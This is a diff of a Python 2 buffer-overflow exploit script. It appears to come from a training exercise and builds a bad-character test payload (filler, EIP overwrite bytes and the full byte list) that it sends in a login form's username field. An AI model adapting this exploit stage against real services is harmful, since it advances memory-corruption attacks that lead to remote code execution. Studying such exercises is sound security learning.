@@ -1,10 +1,6 @@
 #!/usr/bin/python2
 import sys, socket
 
-# Change shellcode to Offset defined above on line 29
-# Replace Buffer Post request details with Wireshark or BurpSuite Post Request details lines 33-41
-# Changes IP Address on lines 34,38,48
-
 badchars = (
 "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
 "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
@@ -25,8 +21,12 @@ badchars = (
 
 try:
   print "\nLocating Bad Characters..."
+  
+  filler = "A" * 780
+  eip = "B" * 4
+  offset = "C" * 4
 
-  shellcode = "A" * 780 + "B" * 4 + "C" * 4 + badchars
+  shellcode = filler + eip + offset + badchars
   
   content = "username=" + shellcode + "&password=A"
 
